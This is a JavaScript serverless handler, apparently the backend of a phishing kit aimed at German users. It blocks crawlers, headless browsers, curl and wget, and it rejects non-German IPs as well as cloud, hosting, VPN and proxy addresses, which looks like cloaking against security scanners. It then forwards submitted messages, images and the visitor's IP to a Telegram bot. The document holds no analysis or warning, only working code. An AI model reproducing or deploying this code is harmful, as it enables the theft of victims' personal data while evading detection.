export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method not allowed');

    const { message, image, deviceData, type } = req.body;
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;
    
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unbekannt';
    if (ip.includes(',')) ip = ip.split(',')[0].trim();

    const userAgent = (req.headers['user-agent'] || '').toLowerCase();

    const botKeywords = ['headless', 'selenium', 'puppeteer', 'crawl', 'bot', 'spider', 'aws', 'amazon', 'python', 'curl', 'wget'];
    if (botKeywords.some(keyword => userAgent.includes(keyword))) {
        return res.status(403).json({ error: "Zugriff verweigert (Bot erkannt)" });
    }

    if (ip && ip !== '::1' && ip !== '127.0.0.1' && ip !== 'Unbekannt') {
        try {
            const geoReq = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode,isp,org,as`);
            const geoData = await geoReq.json();

            if (geoData.status === 'success') {
                if (geoData.countryCode !== 'DE') {
                    return res.status(403).json({ error: "Zugriff aus diesem Land nicht gestattet." });
                }

                const providerInfo = (geoData.isp + ' ' + geoData.org + ' ' + geoData.as).toLowerCase();
                const blockedProviders = [
                    'amazon', 'aws', 'google cloud', 'google llc', 'microsoft', 'azure', 
                    'digitalocean', 'hetzner', 'ovh', 'alibaba', 'oracle', 'linode', 'vultr', 
                    'facebook', 'datacenter', 'hosting', 'server', 'vpn', 'proxy'
                ];

                if (blockedProviders.some(p => providerInfo.includes(p))) {
                    return res.status(403).json({ error: "Zugriff über VPN oder Hosting-Server verweigert." });
                }
            }
        } catch (err) {
        }
    }

    const fullCaption = `<b>🔔 Neue Eingabe: ${type || 'Allgemein'}</b>\n\n${message || 'Keine Nachricht'}\n\n📍 IP: ${ip}\n📱 Gerät: ${deviceData || 'k.A.'}`;

    try {
        if (image && image.includes('base64')) {
            const base64Data = image.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            
            const fileBlob = new Blob([buffer], { type: 'image/jpeg' });
            formData.append('photo', fileBlob, 'upload.jpg');
            formData.append('caption', fullCaption);
            formData.append('parse_mode', 'HTML');

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } else {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    text: fullCaption, 
                    parse_mode: 'HTML' 
                })
            });
        }
        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(500).json({ error: "Senden fehlgeschlagen", details: error.message });
    }
}